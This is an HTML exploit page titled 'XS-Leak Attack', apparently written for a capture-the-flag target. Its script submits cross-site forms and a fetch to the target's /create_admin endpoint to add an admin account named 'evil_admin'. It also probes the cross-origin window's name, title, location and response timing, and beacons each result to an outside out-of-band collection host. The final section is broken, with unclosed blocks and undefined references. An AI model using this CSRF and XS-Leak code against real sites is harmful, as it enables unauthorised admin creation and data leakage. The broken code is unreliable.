<!DOCTYPE html>
<html>

    <meta charset="UTF-8">
    <title>XS-Leak Attack</title>

<script>
const TARGET = "https://tasks.goidactf.ru:20385";
const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
const ADMIN = "evil_admin";

const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));

const attackWindow = window.open(TARGET + "/admin", "attackWindow");
let attackCompleted = false;

setTimeout(() => {
    const form = document.createElement("form");
    form.method = "POST";
    form.action = TARGET + "/create_admin";
    form.target = "attackWindow";
    
    const input = document.createElement("input");
    input.name = "new_admin_login";
    input.value = ADMIN;
    
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    
    log("form_submitted=true");
    attackCompleted = true;
}, 1000);

setTimeout(() => {
    log("window_closed=" + attackWindow.closed);
}, 2000);

setTimeout(() => {
    let name = "blocked";
    try {
        name = attackWindow.name;
    } catch(e) {}
    log("window_name=" + name);
}, 2500);

setTimeout(() => {
    const start = performance.now();
    let title = "x-origin";
    try {
        title = attackWindow.document.title;
    } catch(e) {}
    log("title=" + title + "|time=" + (performance.now() - start));
}, 3000);

setTimeout(() => {
    try {
        log("location=" + attackWindow.location.href);
    } catch(e) {
        log("location=blocked");
    }
}, 4000);

const timingAttack = () => {
    const start = performance.now();
    fetch(TARGET + "/create_admin", {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'new_admin_login=' + ADMIN
    }).finally(() => {
        log("fetch_time=" + (performance.now() - start));
    });
};

setTimeout(timingAttack, 3500);

const iframe = document.createElement('iframe');

iframe.id = 'leakFrame';
document.body.appendChild(iframe);

iframe.onload = () => {
    const formHtml = `
        <form id="expForm" method="POST" action="/create_admin">
            <input type="hidden" name="new_admin_login" value="${ADMIN}">
        </form>
        <script>
            document.getElementById('expForm').submit();
            setTimeout(() => {
                try {
                    parent.postMessage({type: 'location', href: location.href}, '*');
                } catch(e) {
                    parent.postMessage({type: 'error', error: 'cross-origin'}, '*');
                }
            }, 1500);
        <\/script>
    `;
    
    try {
        iframe.contentDocument.write(formHtml);
    } catch(e) {
        log("iframe_write_error=" + e.message);
    }
};

setTimeout(() => {
    iframe.src = TARGET + "/admin";
}, 500);

window.addEventListener('message', (event) => {
    if (event.data.type === 'error') {
        log("iframe_error=" + event.data.error);
    } else if (event.data.type === 'location') {
        log("iframe_location=" + event.data.href);
    }
});

const imgLeak = () => {
    const img = new Image();
    img.onerror = () => log("img_error=true");
    img.onload = () => log("img_loaded=true");

};

setTimeout(imgLeak, 4500);

    const form = document.createElement('form');
    form.method = 'GET';
    form.action = TARGET + "/create_admin";
    form.target = 'redirectWindow';
    form.innerHTML = `<input type="hidden" name="new_admin_login" value="${ADMIN}">`;
    
    document.body.appendChild(form);
    form.submit();
    
    setTimeout(() => {
        try {
            log("redirect_location=" + redirectWindow.location.href);
        } catch(e) {
            log("redirect_blocked=" + e.message);

setTimeout(checkRedirectChain, 5000);
